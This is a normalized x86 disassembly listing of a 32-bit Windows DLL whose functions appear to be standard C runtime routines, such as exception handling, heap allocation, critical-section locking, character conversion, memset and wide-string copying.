cmp esi eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ebx [ ebp - 0x4 ]
add eax esi
cmp eax esi
jb r-xdata
mov eax esi
lea eax [ esi + 0x10 ]
cmp eax esi
jb r-xdata
push eax
push ebx
call sub_100046bb
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push ebx
call sub_100046bb
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea ebx [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_10005e82
push 0x24
push r--data
call sub_10004750
xor ebx ebx
mov [ ebp - 0x20 ] ebx
xor edi edi
mov [ ebp - 0x28 ] edi
mov esi [ ebp + 0x8 ]
cmp esi 0xb
jg r-xdata
mov eax esi
sub eax 0xf
je r-xdata
je r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_100033a8
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax esi
push 0x2
pop ecx
sub eax ecx
je r-xdata
xor eax eax
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
push esi
call sub_10006037
pop ecx
pop ecx
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax [ eax ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
test ebx ebx
je r-xdata
push 0x3
call sub_100039e7
xor ebx ebx
inc ebx
mov [ ebp - 0x20 ] ebx
push eax
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_100057e9
mov [ eax ] 0x16
call sub_10005b17
jmp r-xdata
mov [ ebp - 0x24 ] eax
cmp eax 0x1
je r-xdata
call sub_10004795
retn
sub eax ecx
je r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi 0x8
je r-xdata
push 0x0
call sub_1000494d
pop ecx
sub eax ecx
jne r-xdata
mov eax [ edi + 0x60 ]
mov [ ebp - 0x30 ] eax
and [ edi + 0x60 ] 0x0
cmp esi 0x8
jne r-xdata
cmp esi 0xb
je r-xdata
push 0x0
call [ EncodePointer@IAT ]
mov ecx [ ebp - 0x1c ]
mov [ ecx ] eax
mov eax [ edi + 0x64 ]
mov [ ebp - 0x34 ] eax
mov [ edi + 0x64 ] 0x8c
cmp esi 0x4
jne r-xdata
push esi
call [ ebp - 0x24 ]
push [ edi + 0x64 ]
push esi
call [ ebp - 0x24 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov edx ecx
mov [ ebp - 0x2c ] edx
cmp esi 0x8
jne r-xdata
mov eax [ ebp - 0x30 ]
mov [ edi + 0x60 ] eax
cmp esi 0x8
jne r-xdata
cmp esi 0xb
je r-xdata
pop ecx
cmp esi 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10005ffd
cmp esi 0x8
jne r-xdata
mov ecx edx
imul ecx ecx 0xc
mov eax [ edi + 0x5c ]
and [ ecx + eax + 0x8 ] 0x0
inc edx
mov [ ebp - 0x2c ] edx
mov ecx [ r--data ]
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov [ edi + 0x64 ] eax
cmp esi 0x4
jne r-xdata
mov eax [ r--data ]
add eax ecx
cmp edx eax
jge r-xdata
sub_10006037
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ r--data ]
push esi
mov esi [ ebp + 0x8 ]
imul edx edx 0xc
add edx [ ebp + 0xc ]
cmp ecx edx
jae r-xdata
mov eax edx
imul eax eax 0xc
add eax [ ebp + 0xc ]
add ecx 0xc
cmp ecx eax
jb r-xdata
xor eax eax
cmp [ ecx + 0x4 ] esi
jne r-xdata
cmp [ ecx + 0x4 ] esi
je r-xdata
mov eax ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_10006080
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_10006110
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_10007ca5
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_10007cc4
jmp r-xdata
sub_10006110
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_10002de0
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_10006080
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_10006172
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_100061a2
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_100061d2
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_10004628
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_10004628
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor eax eax
pop esi
retn
mov eax [ rw-data ]
jmp r-xdata
push 0x1a
pop eax
pop esi
retn
mov [ edx + eax ] ecx
add ecx 0x20
lea edx [ edx + 0x4 ]
cmp ecx rw-data
jge r-xdata
sub_1000626c
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov ecx rw-data
cmp esi ecx
jb r-xdata
lea eax [ esi + 0x20 ]
push eax
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov eax esi
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_1000494d
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_100062ab
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_1000494d
mov eax [ ebp + 0xc ]
pop ecx
or [ eax + 0xc ] 0x8000
pop ebp
retn
sub_100062db
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_10004ab1
pop ecx
pop ebp
retn
sub_10006315
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
lea eax [ ecx + 0x10 ]
push eax
call sub_10004ab1
pop ecx
pop ebp
retn
sub_10006342
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10004e30
movzx esi [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
mov cl [ ebp + 0x14 ]
test [ eax + esi + 0x19 ] cl
jne r-xdata
xor edx edx
inc edx
xor edx edx
cmp [ ebp + 0x10 ] edx
je r-xdata
mov eax edx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax edx
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x90 ]
movzx eax [ eax + esi * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
test eax eax
je r-xdata
sub_100063ae
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_1000355d
pop ecx
pop ebp
retn
push ebx
jmp r-xdata
push [ ebp + 0x8 ]
call sub_10003622
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_100035ef
pop ecx
call sub_100057e9
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
inc esi
mov eax ebx
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop ebx
call sub_100057e9
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_100057fc
pop ecx
mov [ esi ] eax
push esi
call sub_100035ef
pop ecx
test eax eax
je r-xdata
call sub_100057e9
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_100057fc
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_10006459
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
imul esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div esi
cmp eax [ ebp + 0xc ]
jae r-xdata
xor ecx ecx
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_100057e9
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ecx eax
test ecx ecx
jne r-xdata
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
push esi
call sub_100035ef
pop ecx
test eax eax
jne r-xdata
mov eax ecx
mov [ eax ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
mov [ eax ] 0xc
sub_100064d3
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10003622
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10003622
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10003622
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10003622
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10003622
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10003622
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10003622
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10003622
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10003622
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10003622
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10003622
pop ecx
mov eax [ esi + 0x4c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10003622
pop ecx
push eax
call sub_10003622
pop ecx
sub_100065cf
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10003622
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10003622
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10003622
pop ecx
mov eax [ esi + 0x34 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_10003622
pop ecx
push eax
call sub_10003622
pop ecx
sub_10006636
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_10003622
push [ esi + 0x8 ]
call sub_10003622
push [ esi + 0xc ]
call sub_10003622
push [ esi + 0x10 ]
call sub_10003622
push [ esi + 0x14 ]
call sub_10003622
push [ esi + 0x18 ]
call sub_10003622
push [ esi ]
call sub_10003622
push [ esi + 0x20 ]
call sub_10003622
push [ esi + 0x24 ]
call sub_10003622
push [ esi + 0x28 ]
call sub_10003622
push [ esi + 0x2c ]
call sub_10003622
push [ esi + 0x30 ]
call sub_10003622
push [ esi + 0x34 ]
call sub_10003622
push [ esi + 0x1c ]
call sub_10003622
push [ esi + 0x38 ]
call sub_10003622
push [ esi + 0x3c ]
call sub_10003622
add esp 0x40
push [ esi + 0x40 ]
call sub_10003622
push [ esi + 0x44 ]
call sub_10003622
push [ esi + 0x48 ]
call sub_10003622
push [ esi + 0x4c ]
call sub_10003622
push [ esi + 0x50 ]
call sub_10003622
push [ esi + 0x54 ]
call sub_10003622
push [ esi + 0x58 ]
call sub_10003622
push [ esi + 0x5c ]
call sub_10003622
push [ esi + 0x60 ]
call sub_10003622
push [ esi + 0x64 ]
call sub_10003622
push [ esi + 0x68 ]
call sub_10003622
push [ esi + 0x6c ]
call sub_10003622
push [ esi + 0x70 ]
call sub_10003622
push [ esi + 0x74 ]
call sub_10003622
push [ esi + 0x78 ]
call sub_10003622
push [ esi + 0x7c ]
call sub_10003622
add esp 0x40
push [ esi + 0x80 ]
call sub_10003622
push [ esi + 0x84 ]
call sub_10003622
push [ esi + 0x88 ]
call sub_10003622
push [ esi + 0x8c ]
call sub_10003622
push [ esi + 0x90 ]
call sub_10003622
push [ esi + 0x94 ]
call sub_10003622
push [ esi + 0x98 ]
call sub_10003622
push [ esi + 0x9c ]
call sub_10003622
push [ esi + 0xa0 ]
call sub_10003622
push [ esi + 0xa4 ]
call sub_10003622
push [ esi + 0xa8 ]
call sub_10003622
push [ esi + 0xb8 ]
call sub_10003622
push [ esi + 0xbc ]
call sub_10003622
push [ esi + 0xc0 ]
call sub_10003622
push [ esi + 0xc4 ]
call sub_10003622
push [ esi + 0xc8 ]
call sub_10003622
add esp 0x40
push [ esi + 0xcc ]
call sub_10003622
push [ esi + 0xb4 ]
call sub_10003622
push [ esi + 0xd4 ]
call sub_10003622
push [ esi + 0xd8 ]
call sub_10003622
push [ esi + 0xdc ]
call sub_10003622
push [ esi + 0xe0 ]
call sub_10003622
push [ esi + 0xe4 ]
call sub_10003622
push [ esi + 0xe8 ]
call sub_10003622
push [ esi + 0xd0 ]
call sub_10003622
push [ esi + 0xec ]
call sub_10003622
push [ esi + 0xf0 ]
call sub_10003622
push [ esi + 0xf4 ]
call sub_10003622
push [ esi + 0xf8 ]
call sub_10003622
push [ esi + 0xfc ]
call sub_10003622
push [ esi + 0x100 ]
call sub_10003622
push [ esi + 0x104 ]
call sub_10003622
add esp 0x40
push [ esi + 0x108 ]
call sub_10003622
push [ esi + 0x10c ]
call sub_10003622
push [ esi + 0x110 ]
call sub_10003622
push [ esi + 0x114 ]
call sub_10003622
push [ esi + 0x118 ]
call sub_10003622
push [ esi + 0x11c ]
call sub_10003622
push [ esi + 0x120 ]
call sub_10003622
push [ esi + 0x124 ]
call sub_10003622
push [ esi + 0x128 ]
call sub_10003622
push [ esi + 0x12c ]
call sub_10003622
push [ esi + 0x130 ]
call sub_10003622
push [ esi + 0x134 ]
call sub_10003622
push [ esi + 0x138 ]
call sub_10003622
push [ esi + 0x13c ]
call sub_10003622
push [ esi + 0x140 ]
call sub_10003622
push [ esi + 0x144 ]
call sub_10003622
add esp 0x40
push [ esi + 0x148 ]
call sub_10003622
push [ esi + 0x14c ]
call sub_10003622
push [ esi + 0x150 ]
call sub_10003622
push [ esi + 0x154 ]
call sub_10003622
push [ esi + 0x158 ]
call sub_10003622
push [ esi + 0x15c ]
call sub_10003622
push [ esi + 0x160 ]
call sub_10003622
add esp 0x1c
sub_100069b6
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x18 ]
push edi
test esi esi
jle r-xdata
mov ecx [ ebp + 0x24 ]
xor edi edi
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx esi
xor eax eax
cmp [ ebp + 0x28 ] eax
push 0x0
setne al
push 0x0
push esi
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push ecx
call [ MultiByteToWideChar@IAT ]
mov ecx eax
mov [ ebp - 0x8 ] ecx
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov ecx eax
mov eax esi
sub eax ecx
dec eax
cmp eax esi
lea esi [ eax + 0x1 ]
jl r-xdata
inc eax
test ecx ecx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov esi eax
dec ecx
cmp [ eax ] 0x0
je r-xdata
or ecx 0xffffffff
xor ebx ebx
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10002de0
leave
retn
push ecx
push ebx
push esi
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea ecx [ ecx * 2 + 0x8 ]
cmp ecx 0x400
ja r-xdata
push ebx
call sub_10006be3
pop ecx
mov eax edi
mov esi [ ebp - 0x8 ]
push 0x0
push 0x0
push esi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10007276
mov edi eax
add esp 0x18
test edi edi
je r-xdata
push ecx
call sub_1000355d
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
mov eax ecx
call sub_10007dc0
mov ebx esp
test ebx ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov [ ebx ] 0xdddd
mov [ ebx ] 0xcccc
jmp r-xdata
test edi edi
jle r-xdata
mov ecx [ ebp + 0x20 ]
test ecx ecx
je r-xdata
test ebx ebx
je r-xdata
add ebx 0x8
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp edi ecx
jg r-xdata
push edi
push esi
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10007276
add esp 0x18
test eax eax
je r-xdata
lea eax [ edi * 2 + 0x8 ]
cmp eax ecx
ja r-xdata
push ecx
push [ ebp + 0x1c ]
push esi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10007276
add esp 0x18
jmp r-xdata
push esi
call sub_10006be3
pop ecx
xor eax eax
push eax
push eax
cmp [ ebp + 0x20 ] eax
jne r-xdata
push eax
call sub_1000355d
mov esi eax
pop ecx
test esi esi
je r-xdata
call sub_10007dc0
mov esi esp
test esi esi
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push eax
jmp r-xdata
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
push edi
push esi
push eax
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov edi eax
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
sub_10006b9f
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10004e30
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_100069b6
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10006be3
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_10003622
pop ecx
sub_10006c01
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x1c ]
push ebx
push esi
push edi
xor edi edi
test ecx ecx
jne r-xdata
xor eax eax
cmp [ ebp + 0x20 ] eax
push edi
push edi
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push ecx
call [ MultiByteToWideChar@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
mov ecx eax
jle r-xdata
xor eax eax
jmp r-xdata
mov esi edi
cmp ebx 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10002de0
leave
retn
lea eax [ ebx + ebx ]
push eax
push edi
push esi
call sub_10006d30
add esp 0xc
push ebx
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea eax [ ebx * 2 + 0x8 ]
cmp eax 0x400
ja r-xdata
push esi
call sub_10006be3
pop ecx
mov eax edi
push [ ebp + 0x18 ]
push eax
push esi
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov edi eax
push eax
call sub_1000355d
mov esi eax
pop ecx
test esi esi
je r-xdata
call sub_10007dc0
mov esi esp
test esi esi
je r-xdata
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
sub_10006ced
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10004e30
push [ ebp + 0x20 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10006c01
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10006d30
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
movzx eax [ esp + 0x8 ]
bt [ rw-data ] 0x1
jae r-xdata
mov edx [ esp + 0xc ]
cmp edx 0x80
jl r-xdata
mov ecx [ esp + 0xc ]
push edi
mov edi [ esp + 0x8 ]
[ edi ]
jmp r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
bt [ rw-data ] 0x1
jb r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
test eax eax
jne r-xdata
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
movd xmm0 eax
punpcklbw xmm0 xmm0
punpcklwd xmm0 xmm0
pshufd xmm0 xmm0 0x0
pxor xmm0 xmm0
jmp r-xdata
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
neg ebx
add ebx 0x10
sub edx ebx
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov ebx edx
and edx 0x7f
shr ebx 0x7
je r-xdata
push ebx
push ecx
mov ebx ecx
and ebx 0xf
test ebx ebx
jne r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec ebx
jne r-xdata
pop edx
jmp r-xdata
movd [ ecx ] xmm0
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop eax
pop ebx
retn
mov ebx edx
shr ebx 0x4
je r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov ebx edx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec ebx
jne r-xdata
and ebx 0x3
je r-xdata
movd [ ecx ] xmm0
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] al
inc ecx
dec ebx
jne r-xdata
sub_10006dc0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
call sub_100057e9
push 0x16
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov edx [ ebp + 0x10 ]
test edx edx
jne r-xdata
mov esi edi
xor eax eax
mov [ edi ] ax
test ecx ecx
je r-xdata
add esi 0x2
dec ecx
jne r-xdata
sub esi edx
cmp [ esi ] 0x0
je r-xdata
xor eax eax
test ecx ecx
jne r-xdata
dec ecx
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ edi ] ax
call sub_100057e9
push 0x22
jmp r-xdata
movzx eax [ edx ]
mov [ esi + edx ] ax
lea edx [ edx + 0x2 ]
test ax ax
je r-xdata
pop esi
mov [ eax ] esi
call sub_10005b17
mov eax esi
sub_10006e2c
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_100057e9
push 0x16
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
push edi
mov edi esi
sub edi ecx
xor eax eax
mov [ esi ] ax
xor eax eax
pop edi
test edx edx
jne r-xdata
dec edx
jne r-xdata
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_100057e9
push 0x22
jmp r-xdata
movzx eax [ ecx ]
mov [ edi + ecx ] ax
lea ecx [ ecx + 0x2 ]
test ax ax
je r-xdata
pop esi
mov [ eax ] esi
call sub_10005b17
mov eax esi
sub_10006ea1
push ebp
mov ebp esp
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
push esi
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
call sub_100057e9
push 0x16
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] ecx
jne r-xdata
test edx edx
jne r-xdata
xor eax eax
jmp r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
xor eax eax
mov [ ecx ] ax
jmp r-xdata
pop esi
pop ebp
retn
push ebx
push edi
mov ebx ecx
mov edi eax
cmp edx 0xffffffff
jne r-xdata
xor eax eax
mov [ ecx ] ax
sub esi ecx
sub ebx esi
test edx edx
jne r-xdata
dec edi
je r-xdata
test edi edi
pop edi
pop ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ebx ] ax
dec edx
jne r-xdata
cmp edx 0xffffffff
jne r-xdata
movzx eax [ esi ]
mov [ ebx + esi ] ax
lea esi [ esi + 0x2 ]
test ax ax
je r-xdata
jmp r-xdata
movzx eax [ esi + ebx ]
mov [ ebx ] ax
lea ebx [ ebx + 0x2 ]
test ax ax
je r-xdata
xor eax eax
mov [ ecx ] ax
call sub_100057e9
push 0x22
jmp r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
push 0x50
mov [ ecx + eax * 2 - 0x2 ] dx
pop eax
jmp r-xdata
pop esi
mov [ eax ] esi
call sub_10005b17
mov eax esi
sub_10006f5f
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
js r-xdata
call sub_100057e9
mov [ eax ] 0x16
call sub_10005b17
or eax 0xffffffff
pop ebp
retn
cmp eax 0x2
jle r-xdata
